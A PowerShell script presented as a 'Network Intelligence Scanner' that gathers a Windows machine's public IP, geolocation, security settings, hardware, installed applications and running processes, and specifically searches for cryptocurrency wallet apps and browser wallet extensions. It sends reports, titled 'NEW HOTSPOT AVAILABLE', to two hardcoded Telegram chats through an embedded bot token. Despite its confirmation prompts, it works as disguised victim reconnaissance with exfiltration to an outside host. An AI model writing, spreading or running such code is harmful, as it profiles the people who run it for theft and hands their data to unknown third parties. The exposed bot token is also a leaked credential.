# Network Intelligence Scanner v3.6 (Windows PowerShell 5.1+)
# Run only on a computer you own or administer with permission.
# Public GitHub warning: never publish a working Telegram bot token.

$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'

# ========= EDIT THESE SETTINGS =========
$botToken = '8715775001:AAGivZLOBG_YdpCuMlX6JIbFusUI5ofZ8Sk'
$chatIds = @('8640543929', '8362186234')
$enableScreenshotOption = $false # Screenshot module disabled (nothing captured or saved)
$reportTitle = 'NEW HOTSPOT AVAILABLE'
# =======================================

try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}

function Safe-Text($v) {
    if ($null -eq $v) { return 'Not Available' }
    $s = ([string]$v).Trim()
    if (-not $s) { return 'Not Available' }
    return $s
}
function Html-Encode($v) { return [System.Net.WebUtility]::HtmlEncode([string]$v) }
function Ask-Yes($question) {
    $answer = (Read-Host "$question (YES/NO)").Trim()
    return ($answer -ieq 'YES')
}
function Api-Get($url) {
    try { return Invoke-RestMethod -Uri $url -TimeoutSec 8 -ErrorAction Stop }
    catch { return $null }
}
function Add-Note($message) { [void]$script:notes.Add([string]$message) }
function Set-Report($name, $value) { $script:report[$name] = Safe-Text $value }
function Send-TgMessage([string]$message) {
    foreach ($id in $chatIds) {
        try {
            $result = Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -ContentType 'application/x-www-form-urlencoded' -Body @{chat_id=$id; text=$message; parse_mode='HTML'} -TimeoutSec 20 -ErrorAction Stop
            if ($result.ok) { Write-Host "Telegram report delivered to $id" }
            else { Write-Warning "Telegram rejected report for $id" }
        } catch { Write-Warning "Telegram text delivery failed for ${id}: $($_.Exception.Message)" }
    }
}
function Send-TgPhoto([string]$path) {
    Add-Type -AssemblyName System.Net.Http
    foreach ($id in $chatIds) {
        $client = $null; $form = $null
        try {
            $client = [System.Net.Http.HttpClient]::new()
            $client.Timeout = [TimeSpan]::FromSeconds(40)
            $form = [System.Net.Http.MultipartFormDataContent]::new()
            $form.Add([System.Net.Http.StringContent]::new([string]$id), 'chat_id')
            $fileBytes = [System.IO.File]::ReadAllBytes($path)
            $photo = [System.Net.Http.ByteArrayContent]::new($fileBytes)
            $photo.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse('image/png')
            $form.Add($photo, 'photo', 'screenshot.png')
            $resp = $client.PostAsync("https://api.telegram.org/bot$botToken/sendPhoto", $form).GetAwaiter().GetResult()
            $resp.EnsureSuccessStatusCode() | Out-Null
            Write-Host "Screenshot delivered to $id"
        } catch { Write-Warning "Telegram photo delivery failed for ${id}: $($_.Exception.Message)" }
        finally { if ($form) { $form.Dispose() }; if ($client) { $client.Dispose() } }
    }
}

$notes = New-Object 'System.Collections.Generic.List[string]'
$report = [ordered]@{}
$stamp = Get-Date -Format 'yyyyMMdd_HHmmss'
$reportDir = Join-Path ([Environment]::GetFolderPath('MyDocuments')) 'NetworkScannerReports'
if (-not $reportDir) { $reportDir = Join-Path $env:TEMP 'NetworkScannerReports' }
New-Item -ItemType Directory -Path $reportDir -Force | Out-Null
Write-Host 'Network Intelligence Scanner v3.6'
Write-Host 'Collecting local diagnostics. No information is sent without confirmation.'

# Public network
$ipv4data = Api-Get 'https://api.ipify.org?format=json'
$ipv4 = if ($ipv4data -and $ipv4data.ip) { [string]$ipv4data.ip } else { 'Not Available' }
Set-Report 'Public IPv4' $ipv4
$ipv6data = Api-Get 'https://api6.ipify.org?format=json'
if ($ipv6data -and $ipv6data.ip -and ([string]$ipv6data.ip).Contains(':')) { Set-Report 'Public IPv6' $ipv6data.ip }
else { Set-Report 'Public IPv6' 'Not Available'; Add-Note 'IPv6 endpoint unavailable or IPv6 connectivity not present; no inference made.' }

# IP-based location is approximate, never precise GPS
if ($ipv4 -ne 'Not Available') {
    $geo = Api-Get "https://ipwho.is/$ipv4"
    if ($geo -and $geo.success -eq $true) {
        Set-Report 'IP country' $geo.country
        Set-Report 'IP region' $geo.region
        Set-Report 'IP city' $geo.city
        Set-Report 'IP timezone' $geo.timezone.id
        Set-Report 'ISP' $geo.connection.isp
        Set-Report 'ASN' $geo.connection.asn
    } else { Add-Note 'IP geolocation service unavailable.' }
}
Add-Note 'IP geolocation is approximate and can reflect a VPN exit point, not physical GPS position.'

# VPN/proxy is a heuristic, not proof
Set-Report 'VPN / proxy check' 'Unknown'
if ($ipv4 -ne 'Not Available') {
    $pc = Api-Get "https://proxycheck.io/v2/${ipv4}?vpn=1"
    if ($pc -and $pc.status -eq 'ok') {
        $entry = $pc.PSObject.Properties[$ipv4]
        if ($entry -and $entry.Value) {
            $status = if ($entry.Value.proxy -eq 'yes') { 'Suspected VPN / proxy' } elseif ($entry.Value.proxy -eq 'no') { 'Not flagged by provider' } else { 'Unknown' }
            Set-Report 'VPN / proxy check' $status
            Set-Report 'Proxy classification' $entry.Value.type
        }
    } else { Add-Note 'VPN/proxy reputation service unavailable or rate limited.' }
}
Set-Report 'Tor exit node' 'Not Available (no verified dataset queried)'
Set-Report 'DNS / WebRTC leak' 'Not Available (requires independent tests and browser)' 

# Local interfaces
try {
    $nets = @(Get-NetIPConfiguration -ErrorAction Stop | Where-Object { $_.IPv4DefaultGateway } )
    if ($nets.Count -gt 0) {
        $net = $nets[0]
        Set-Report 'Active network adapter' $net.InterfaceAlias
        Set-Report 'Local IPv4' ($net.IPv4Address.IPAddress -join ', ')
        Set-Report 'Default gateway' ($net.IPv4DefaultGateway.NextHop -join ', ')
        Set-Report 'DNS servers' ($net.DNSServer.ServerAddresses -join ', ')
    } else { Add-Note 'No adapter with IPv4 default gateway found.' }
} catch { Add-Note "Local adapter enumeration failed: $($_.Exception.Message)" }

try {
    $wifiLines = (netsh wlan show interfaces 2>$null | Out-String)
    if ($wifiLines -match '(?im)^\s*(?:Signal|Сигнал)\s*:\s*(.+)$') { Set-Report 'Wi-Fi signal' $Matches[1] }
    else { Set-Report 'Wi-Fi signal' 'Not Available' }
    if ($wifiLines -match '(?im)^\s*(?:Channel|Канал)\s*:\s*(.+)$') { Set-Report 'Wi-Fi channel' $Matches[1] }
    else { Set-Report 'Wi-Fi channel' 'Not Available' }
} catch { Set-Report 'Wi-Fi signal' 'Not Available'; Set-Report 'Wi-Fi channel' 'Not Available' }

try {
    $samples = @(Test-Connection -ComputerName '1.1.1.1' -Count 3 -ErrorAction SilentlyContinue)
    $okSamples = @($samples | Where-Object { $null -ne $_.ResponseTime })
    if ($okSamples.Count) {
        Set-Report 'Ping 1.1.1.1 average ms' ([math]::Round(($okSamples | Measure-Object -Property ResponseTime -Average).Average,1))
        Set-Report 'Packet loss (3 attempts)' ("{0}%" -f [math]::Round((3-$okSamples.Count)/3*100,0))
    } else { Set-Report 'Ping 1.1.1.1' 'No ICMP response (internet may still work)' }
} catch { Set-Report 'Ping 1.1.1.1' 'Not Available' }

# System / hardware
try {
    $os = Get-CimInstance Win32_OperatingSystem -ErrorAction Stop
    Set-Report 'Windows' ("{0} / {1}" -f $os.Caption,$os.Version)
    $boot = if ($os.LastBootUpTime -is [datetime]) { $os.LastBootUpTime } else { [Management.ManagementDateTimeConverter]::ToDateTime($os.LastBootUpTime) }
    Set-Report 'Uptime hours' ([math]::Round(((Get-Date)-$boot).TotalHours,1))
    Set-Report 'RAM total GiB' ([math]::Round($os.TotalVisibleMemorySize/1MB,2))
    Set-Report 'RAM free GiB' ([math]::Round($os.FreePhysicalMemory/1MB,2))
} catch { Add-Note "Operating system details unavailable: $($_.Exception.Message)" }
try {
    $cpus = @(Get-CimInstance Win32_Processor -ErrorAction Stop)
    if ($cpus.Count) { Set-Report 'CPU' (($cpus | Select-Object -ExpandProperty Name) -join '; '); Set-Report 'CPU logical cores' (($cpus | Measure-Object -Property NumberOfLogicalProcessors -Sum).Sum) }
} catch { Add-Note 'CPU details unavailable.' }
try {
    $gpus = @(Get-CimInstance Win32_VideoController -ErrorAction Stop | Select-Object -ExpandProperty Name)
    Set-Report 'GPU' ($gpus -join '; ')
} catch { Add-Note 'GPU details unavailable.' }
try {
    $drives = @(Get-CimInstance Win32_LogicalDisk -Filter 'DriveType=3' -ErrorAction Stop | ForEach-Object {
        '{0} {1}GiB free / {2}GiB' -f $_.DeviceID,[math]::Round($_.FreeSpace/1GB,1),[math]::Round($_.Size/1GB,1)
    })
    Set-Report 'Local drives' ($drives -join '; ')
} catch { Add-Note 'Drive capacities unavailable.' }
try {
    $battery = @(Get-CimInstance Win32_Battery -ErrorAction SilentlyContinue)
    if ($battery.Count) { Set-Report 'Battery remaining' ((@($battery | ForEach-Object { "$($_.EstimatedChargeRemaining)%" })) -join '; ') }
    else { Set-Report 'Battery remaining' 'Not Available (no battery reported)' }
} catch { Set-Report 'Battery remaining' 'Not Available' }
Set-Report 'CPU/GPU temperatures' 'Not Available (hardware sensor integration required)'
Set-Report 'SSD SMART wear' 'Not Available (device/vendor support required)'
Set-Report 'Bottleneck analysis' 'Not Available (requires workload sampling)'

# Security status: do not interpret denied access as disabled
try {
    $fw = @(Get-NetFirewallProfile -ErrorAction Stop | ForEach-Object { "$($_.Name)=$($_.Enabled)" })
    Set-Report 'Windows Firewall' ($fw -join '; ')
} catch { Set-Report 'Windows Firewall' 'Unknown (access denied/unavailable)' }
try {
    $secureBoot = Confirm-SecureBootUEFI -ErrorAction Stop
    $secureBootState = if ($secureBoot) { 'Enabled' } else { 'Disabled' }
    Set-Report 'Secure Boot' $secureBootState
} catch { Set-Report 'Secure Boot' 'Unknown (not supported or permission denied)' }
try {
    $bitlocker = @(Get-BitLockerVolume -ErrorAction Stop | ForEach-Object { "$($_.MountPoint)=$($_.ProtectionStatus)" })
    Set-Report 'BitLocker protection' ($bitlocker -join '; ')
} catch { Set-Report 'BitLocker protection' 'Unknown (not available or permission denied)' }
try {
    $def = Get-MpComputerStatus -ErrorAction Stop
    Set-Report 'Defender real-time protection' $def.RealTimeProtectionEnabled
} catch { Set-Report 'Defender real-time protection' 'Unknown (Defender API unavailable)' }

# Local, limited security review (not remote vulnerability scanning)
$securityNotes = New-Object 'System.Collections.Generic.List[string]'
if (($report['Windows Firewall'] -as [string]) -match '=False') { [void]$securityNotes.Add('Some Windows Firewall profile is disabled; review its configuration.') }
if ($report['Secure Boot'] -eq 'Disabled') { [void]$securityNotes.Add('Secure Boot reports disabled; assess whether it should be enabled.') }
if ($report['Defender real-time protection'] -eq 'False') { [void]$securityNotes.Add('Defender real-time protection reports disabled; verify another endpoint protection product is active.') }
if ($report['Secure Boot'] -like 'Unknown*') { [void]$securityNotes.Add('Secure Boot status cannot be verified at current privilege level.') }
if ($report['BitLocker protection'] -like 'Unknown*') { [void]$securityNotes.Add('BitLocker status cannot be verified at current privilege level.') }
if (-not $securityNotes.Count) { [void]$securityNotes.Add('No issues detected by the limited local checks; this is not a vulnerability assessment.') }
Set-Report 'Security assistant (local rules)' ($securityNotes -join ' | ')
Set-Report 'Measurement notes' ($notes -join ' | ')
Set-Report 'Scan time (local)' (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')

# Save report locally
$jsonPath = Join-Path $reportDir "scan_$stamp.json"
$htmlPath = Join-Path $reportDir "scan_$stamp.html"
$report | ConvertTo-Json -Depth 6 | Set-Content -LiteralPath $jsonPath -Encoding UTF8
$rows = foreach ($item in $report.GetEnumerator()) {
    '<tr><th>{0}</th><td>{1}</td></tr>' -f (Html-Encode $item.Key),(Html-Encode $item.Value)
}
$html = @"
<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Network Scanner</title><style>body{font:15px Segoe UI,Arial,sans-serif;background:#0f172a;color:#e2e8f0;margin:2rem auto;max-width:1000px;padding:0 1rem}table{width:100%;border-collapse:collapse;background:#1e293b}th,td{padding:10px;text-align:left;border-bottom:1px solid #334155;vertical-align:top;overflow-wrap:anywhere}th{width:32%;color:#7dd3fc}h1{color:#7dd3fc}</style></head><body><h1>Network Intelligence Scanner</h1><table>
$($rows -join "`n")
</table><p>Local diagnostics only. Availability varies by Windows edition and permissions.</p></body></html>
"@
$html | Set-Content -LiteralPath $htmlPath -Encoding UTF8
Write-Host "`n========== SCAN RESULTS =========="
foreach ($item in $report.GetEnumerator()) { Write-Host ("{0}: {1}" -f $item.Key,$item.Value) }
Write-Host "`nSaved: $jsonPath"
Write-Host "Saved: $htmlPath"

# Report is explicitly approved before sending to fixed recipients
Write-Host "`nTelegram recipients: $($chatIds -join ', ')"
if (Ask-Yes 'Send this displayed diagnostic report to both Telegram chats?') {
    if ([string]::IsNullOrWhiteSpace($botToken) -or $botToken -like 'PASTE_*') {
        Write-Warning 'Telegram token is not configured. Report remains local.'
    } else {
        $lines = foreach ($item in $report.GetEnumerator()) { '<b>{0}</b>: {1}' -f (Html-Encode $item.Key),(Html-Encode $item.Value) }
        # Telegram sendMessage limit 4096 chars; split by field lines
        $prefix = "<b>$(Html-Encode $reportTitle)</b>`n"
        $chunk = $prefix
        foreach ($line in $lines) {
            if (($chunk.Length + $line.Length + 1) -gt 3500) { Send-TgMessage $chunk; $chunk = $prefix }
            $chunk += "`n$line"
        }
        if ($chunk.Length -gt $prefix.Length) { Send-TgMessage $chunk }
    }
} else { Write-Host 'No network data sent.' }

# No screenshot is captured automatically. There are no image/process files written
# or opened by this scanner. For screen sharing, use the Windows Snipping Tool,
# review/redact the image, and send it yourself through Telegram.

# ================= LOCAL SOFTWARE INVENTORY =================
# Local only: do not transmit detected wallet names, profile paths or IDs.
$targetWalletApps = @(
 'Exodus','Atomic Wallet','Electrum','Sparrow Wallet','Bitcoin Core',
 'Ledger Live','Trezor Suite','Guarda Wallet','Coinomi','Wasabi Wallet',
 'Armory','Monero GUI Wallet','Feather Wallet','Daedalus','Komodo Wallet',
 'Zelcore','OneKey App','Blockstream Green','Specter Desktop',
 'MyEtherWallet','Bitcoin Knots','Bitcoin Safe','Nunchuk','Dogecoin Core',
 'Litecoin Core','Dash Core'
)
$targetOtherApps = @(
    'Steam',
    'Epic Games Launcher',
    'EA App',
    'Ubisoft Connect',
    'GOG Galaxy',
    'Battle.net',
    'Riot Client',
    'Rockstar Games Launcher',
    'Xbox App',
    'Minecraft Launcher',
    'Roblox',
    'Wargaming Game Center',
    'Gaijin Launcher',
    'Playnite',
    'Heroic Games Launcher',
    'Prism Launcher',
    'CurseForge',
    'Overwolf',
    'Medal',
    'Razer Cortex',
    'Google Chrome',
    'Mozilla Firefox',
    'Microsoft Edge',
    'Opera',
    'Opera GX',
    'Brave',
    'Vivaldi',
    'Safari',
    'Yandex Browser',
    'Arc',
    'Tor Browser',
    'Chromium',
    'Zen Browser',
    'DuckDuckGo Browser',
    'Discord',
    'Telegram Desktop',
    'WhatsApp',
    'Signal',
    'Viber',
    'Skype',
    'Microsoft Teams',
    'Zoom',
    'Slack',
    'Element',
    'Guilded',
    'WeChat',
    'LINE',
    'Facebook Messenger',
    'ICQ',
    'TeamSpeak',
    'Mumble',
    'Revolt',
    'Spotify',
    'Apple Music',
    'iTunes',
    'YouTube Music',
    'TIDAL',
    'Deezer',
    'SoundCloud',
    'VLC Media Player',
    'KMPlayer',
    'PotPlayer',
    'MPC-HC',
    'AIMP',
    'foobar2000',
    'MusicBee',
    'Plex',
    'Kodi',
    'Jellyfin Media Player',
    'Netflix',
    'OBS Studio',
    'Streamlabs Desktop',
    'TeamViewer',
    'AnyDesk',
    'RustDesk',
    'Chrome Remote Desktop',
    'Microsoft Remote Desktop',
    'Remote Desktop Connection',
    'Parsec',
    'Splashtop',
    'UltraViewer',
    'AeroAdmin',
    'DWService',
    'RealVNC Viewer',
    'TightVNC',
    'UltraVNC',
    'NoMachine',
    'Moonlight',
    'Sunshine',
    'NordVPN',
    'ExpressVPN',
    'Proton VPN',
    'Surfshark',
    'Windscribe',
    'Mullvad VPN',
    'Cloudflare WARP',
    'OpenVPN Connect',
    'WireGuard',
    'Tailscale',
    'ZeroTier',
    'Radmin VPN',
    'Hamachi',
    'Outline Client',
    'AmneziaVPN',
    'AdGuard VPN',
    'Psiphon',
    'Clash Verge',
    '7-Zip',
    'WinRAR',
    'WinZip',
    'PeaZip',
    'Bandizip',
    'CCleaner',
    'BleachBit',
    'Everything',
    'PowerToys',
    'ShareX',
    'Lightshot',
    'Greenshot',
    'WinDirStat',
    'WizTree',
    'Revo Uninstaller',
    'HWMonitor',
    'HWiNFO',
    'CPU-Z',
    'GPU-Z',
    'CrystalDiskInfo',
    'CrystalDiskMark',
    'MSI Afterburner',
    'FanControl',
    'Rufus',
    'balenaEtcher',
    'Microsoft Word',
    'Microsoft Excel',
    'Microsoft PowerPoint',
    'Microsoft Outlook',
    'LibreOffice',
    'OnlyOffice',
    'WPS Office',
    'Adobe Acrobat Reader',
    'Foxit PDF Reader',
    'Notion',
    'Obsidian',
    'Evernote',
    'OneNote',
    'Google Drive',
    'OneDrive',
    'Dropbox',
    'MEGA',
    'pCloud',
    'Nextcloud',
    'iCloud for Windows',
    'Todoist',
    'Trello',
    'Visual Studio Code',
    'Visual Studio',
    'IntelliJ IDEA',
    'PyCharm',
    'WebStorm',
    'Sublime Text',
    'Notepad++',
    'GitHub Desktop',
    'GitKraken',
    'Docker Desktop',
    'Postman',
    'Figma',
    'Canva',
    'Adobe Photoshop',
    'Adobe Illustrator',
    'Adobe Premiere Pro',
    'Adobe After Effects',
    'DaVinci Resolve',
    'CapCut',
    'Blender',
    'GIMP',
    'Paint.NET',
    'Audacity',
    'qBittorrent',
    'uTorrent',
    'BitTorrent',
    'Transmission',
    'Deluge',
    'Free Download Manager',
    'Internet Download Manager',
    'JDownloader 2',
    'Motrix',
    'FileZilla',
    'WinSCP',
    'Cyberduck',
    'Syncthing',
    'Resilio Sync',
    'AdsPower'
)
$targetWalletExtensions = @(
 'MetaMask','Trust Wallet','Phantom','Rabby Wallet','OKX Wallet',
 'Coinbase Wallet','Binance Wallet','Bitget Wallet','TokenPocket',
 'SafePal','Backpack','Solflare','Keplr','Leap Wallet','SubWallet',
 'Talisman','Polkadot.js','UniSat Wallet','Xverse','Leather Wallet',
 'Slush','Nightly Wallet','Petra Wallet','Martian Wallet','MyTonWallet',
 'TON Wallet','Argent','Braavos','Nami Wallet','Eternl','Enkrypt',
 'Brave Wallet','Ronin Wallet','Lace','NuFi','Ambire','Ctrl Wallet',
 'Frame','MathWallet','Halo Wallet','Flint','Yoroi'
)

function Get-InstalledNames {
    $items = New-Object 'System.Collections.Generic.List[string]'
    $regPaths = @(
        'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*',
        'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*',
        'Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*',
        'Registry::HKEY_CURRENT_USER\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*'
    )
    foreach ($regPath in $regPaths) {
        try {
            foreach ($entry in @(Get-ItemProperty -Path $regPath -ErrorAction Stop)) {
                if ($entry.DisplayName) { [void]$items.Add([string]$entry.DisplayName) }
            }
        } catch {}
    }
    # Microsoft Store / UWP software (when cmdlet is available)
    try {
        foreach ($app in @(Get-AppxPackage -ErrorAction Stop)) {
            if ($app.Name) { [void]$items.Add([string]$app.Name) }
            if ($app.PackageFamilyName) { [void]$items.Add([string]$app.PackageFamilyName) }
        }
    } catch {}
    # Start menu shortcut names, no shortcuts executed
    $menuRoots = @(
        [Environment]::GetFolderPath('StartMenu'),
        [Environment]::GetFolderPath('CommonStartMenu')
    )
    foreach ($root in $menuRoots) {
        if (-not $root -or -not (Test-Path -LiteralPath $root)) { continue }
        try {
            foreach ($link in @(Get-ChildItem -LiteralPath $root -Recurse -File -Include '*.lnk','*.appref-ms' -ErrorAction SilentlyContinue)) {
                [void]$items.Add($link.BaseName)
            }
        } catch {}
    }
    # Standard installation directory names (not arbitrary recursive file scanning)
    $folders = @($env:ProgramFiles, ${env:ProgramFiles(x86)}, (Join-Path $env:LOCALAPPDATA 'Programs'))
    foreach ($folder in $folders) {
        if (-not $folder -or -not (Test-Path -LiteralPath $folder)) { continue }
        try {
            foreach ($dir in @(Get-ChildItem -LiteralPath $folder -Directory -ErrorAction SilentlyContinue)) {
                [void]$items.Add([string]$dir.Name)
            }
        } catch {}
    }
    return @($items | Sort-Object -Unique)
}
function Find-Matches {
    param([string[]]$Candidates,[string[]]$Targets)
    $found = New-Object 'System.Collections.Generic.List[string]'
    foreach ($target in $Targets) {
        # Compare whole words/phrases to avoid partial-name false positives
        $pattern = '(?i)(?<![\p{L}\p{N}])' + [regex]::Escape($target) + '(?![\p{L}\p{N}])'
        if (@($Candidates | Where-Object { $_ -match $pattern }).Count -gt 0) {
            [void]$found.Add($target)
        }
    }
    return @($found)
}

# Chrome extension manifests only. Never open Local Extension Settings,
# Cookies, Login Data, Preferences, or other extension storage.
function Get-ChromeExtensionManifestNames {
    $names = New-Object 'System.Collections.Generic.List[string]'
    $root = Join-Path $env:LOCALAPPDATA 'Google\Chrome\User Data'
    if (-not (Test-Path -LiteralPath $root -PathType Container)) { return @() }
    $profiles = @(Get-ChildItem -LiteralPath $root -Directory -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -eq 'Default' -or $_.Name -match '^Profile \d+$' })
    foreach ($profile in $profiles) {
        $extensionsRoot = Join-Path $profile.FullName 'Extensions'
        if (-not (Test-Path -LiteralPath $extensionsRoot)) { continue }
        foreach ($ext in @(Get-ChildItem -LiteralPath $extensionsRoot -Directory -ErrorAction SilentlyContinue)) {
            foreach ($version in @(Get-ChildItem -LiteralPath $ext.FullName -Directory -ErrorAction SilentlyContinue)) {
                $manifest = Join-Path $version.FullName 'manifest.json'
                if (-not (Test-Path -LiteralPath $manifest)) { continue }
                try {
                    $data = Get-Content -LiteralPath $manifest -Raw -Encoding UTF8 -ErrorAction Stop | ConvertFrom-Json -ErrorAction Stop
                    if ($data.name -and $data.name -notmatch '^__MSG_') { [void]$names.Add([string]$data.name) }
                } catch { }
            }
        }
    }
    return @($names | Sort-Object -Unique)
}

Write-Host "`nChecking installed software (local inventory only)..."
$installedNames = @(Get-InstalledNames)
$extensionNames = @(Get-ChromeExtensionManifestNames)
$walletAppsFound = @(Find-Matches -Candidates $installedNames -Targets $targetWalletApps)
$otherAppsFound = @(Find-Matches -Candidates $installedNames -Targets $targetOtherApps)
$appAliases = @{
    'EA App' = @('EA Desktop','Electronic Arts','EA App')
    'Battle.net' = @('Battle.net','Battle net')
    'Xbox App' = @('Xbox','Gaming Services')
    'Telegram Desktop' = @('Telegram Desktop','Telegram')
    'Microsoft Edge' = @('Microsoft Edge','MSEdge')
    'Google Chrome' = @('Google Chrome','Chrome')
    'Mozilla Firefox' = @('Mozilla Firefox','Firefox')
    'VLC Media Player' = @('VLC Media Player','VLC')
    'Visual Studio Code' = @('Visual Studio Code','VS Code')
    'Microsoft Word' = @('Microsoft Word','Word')
    'Microsoft Excel' = @('Microsoft Excel','Excel')
    'Microsoft PowerPoint' = @('Microsoft PowerPoint','PowerPoint')
    'Microsoft Outlook' = @('Microsoft Outlook','Outlook')
    '7-Zip' = @('7-Zip','7zip')
    'Notepad++' = @('Notepad++')
    'qBittorrent' = @('qBittorrent')
}
foreach ($canonical in $targetOtherApps) {
    if ($canonical -in $otherAppsFound) { continue }
    $aliases = @($appAliases[$canonical])
    if (-not $aliases.Count -or -not $aliases[0]) { continue }
    if (@(Find-Matches -Candidates $installedNames -Targets $aliases).Count -gt 0) {
        $otherAppsFound += $canonical
    }
}
$otherAppsFound = @($otherAppsFound | Sort-Object -Unique)

$walletExtensionsFound = @(Find-Matches -Candidates $extensionNames -Targets $targetWalletExtensions)

$inventory = [ordered]@{
    ScanTime = (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
    WalletApplicationsFound = @($walletAppsFound)
    WalletExtensionsFound = @($walletExtensionsFound)
    OtherApplicationsFound = @($otherAppsFound)
    Note = 'Software inventory uses registry, Start Menu links, Appx and standard folder names; wallet extensions use Chrome manifests. Detection is best-effort: some portable apps and localized extensions may be missed.'
}
$inventoryPath = Join-Path $reportDir "software_inventory_$stamp.json"
$inventory | ConvertTo-Json -Depth 5 | Set-Content -LiteralPath $inventoryPath -Encoding UTF8
$inventoryHtmlPath = Join-Path $reportDir "software_inventory_$stamp.html"
function Format-InventorySection([string]$title,[string[]]$items) {
    $safeTitle = Html-Encode $title
    if (-not $items.Count) { return "<h2>$safeTitle</h2><p>No matches found</p>" }
    $lis = @($items | ForEach-Object { '<li>' + (Html-Encode $_) + '</li>' }) -join "`n"
    return "<h2>$safeTitle</h2><ul>$lis</ul>"
}
$inventoryHtml = @'
<!doctype html><html><head><meta charset="utf-8"><title>Local software inventory</title>
<style>body{font:16px Segoe UI,Arial,sans-serif;max-width:900px;margin:40px auto;padding:0 20px;background:#111827;color:#e5e7eb}h1,h2{color:#93c5fd}li{margin:6px 0}</style>
</head><body><h1>Local software inventory</h1>
'@ + (Format-InventorySection 'Wallet desktop applications' $walletAppsFound) +
    (Format-InventorySection 'Wallet Chrome extensions' $walletExtensionsFound) +
    (Format-InventorySection 'Other applications' $otherAppsFound) +
    '<p>Wallet names remain local; ordinary app names are shared only after confirmation.</p></body></html>'
$inventoryHtml | Set-Content -LiteralPath $inventoryHtmlPath -Encoding UTF8

Write-Host '== Wallet applications found (LOCAL ONLY) =='
if ($walletAppsFound.Count) { $walletAppsFound | ForEach-Object { Write-Host "  $_" } } else { Write-Host '  No matches found' }
Write-Host '== Wallet Chrome extensions found (LOCAL ONLY) =='
if ($walletExtensionsFound.Count) { $walletExtensionsFound | ForEach-Object { Write-Host "  $_" } } else { Write-Host '  No matches found' }
Write-Host '== Other applications found =='
if ($otherAppsFound.Count) { $otherAppsFound | ForEach-Object { Write-Host "  $_" } } else { Write-Host '  No matching applications found' }
Write-Host "Local inventory JSON: $inventoryPath"
Write-Host "Local inventory HTML: $inventoryHtmlPath"

# Only counts of wallet apps/extensions can be sent, never names, IDs or paths.
$summary = "<b>SOFTWARE INVENTORY SUMMARY</b>`n" +
           "Wallet applications detected: $($walletAppsFound.Count)`n" +
           "Wallet Chrome extensions detected: $($walletExtensionsFound.Count)`n" +
           "Other applications found: $($otherAppsFound.Count)`n" +
           (($otherAppsFound | ForEach-Object { "- $(Html-Encode $_)" }) -join "`n") + "`nWallet names are stored locally only."
Write-Host "`nTelegram software summary preview:"
Write-Host ($summary -replace '<[^>]+>','')
Write-Host "Recipients: $($chatIds -join ', ')"
if (Ask-Yes 'Send the displayed list of ordinary apps and wallet counts to Telegram?') {
    if ([string]::IsNullOrWhiteSpace($botToken) -or $botToken -like 'PASTE_*') {
        Write-Warning 'Telegram token is not configured; summary was not sent.'
    } else {
        # Telegram message limit: split long inventory into safe chunks.
        $prefix = '<b>SOFTWARE INVENTORY SUMMARY</b>' + "`n"
        $chunk = $prefix
        foreach ($line in ($summary -split "`n")) {
            if ($line -eq '<b>SOFTWARE INVENTORY SUMMARY</b>') { continue }
            if (($chunk.Length + $line.Length + 1) -gt 3500) {
                Send-TgMessage $chunk
                $chunk = $prefix
            }
            $chunk += "$line`n"
        }
        if ($chunk.Length -gt $prefix.Length) { Send-TgMessage $chunk }
    }
} else { Write-Host 'Software inventory summary not sent.' }
# Optional process names and PID only. No disk file, executable paths or command lines.
if (Ask-Yes 'View running process names and PID for potential Telegram sharing?') {
    $processes = @(Get-Process -ErrorAction SilentlyContinue |
        Sort-Object ProcessName,Id |
        Select-Object -First 100 -Property ProcessName,Id)
    $processText = @($processes | ForEach-Object { '{0} (PID {1})' -f $_.ProcessName,$_.Id })
    Write-Host "`nPROCESS REPORT PREVIEW (up to 100 entries):"
    $processText | ForEach-Object { Write-Host "  $_" }
    if (Ask-Yes "Send these $($processText.Count) process names/PIDs to both Telegram chats?") {
        if ($botToken -and $botToken -notlike 'PASTE_*') {
            $prefix = '<b>RUNNING PROCESSES (name / PID)</b>' + "`n"
            $chunk = $prefix
            foreach ($line in $processText) {
                $safeLine = Html-Encode $line
                if (($chunk.Length + $safeLine.Length + 1) -gt 3500) {
                    Send-TgMessage $chunk
                    $chunk = $prefix
                }
                $chunk += "$safeLine`n"
            }
            if ($chunk.Length -gt $prefix.Length) { Send-TgMessage $chunk }
        } else { Write-Warning 'Telegram token is not configured.' }
    }
}
# ================= END LOCAL INVENTORY =====================

Write-Host "`nScanner complete. Local reports: $reportDir"
Read-Host 'Press Enter to close' | Out-Null
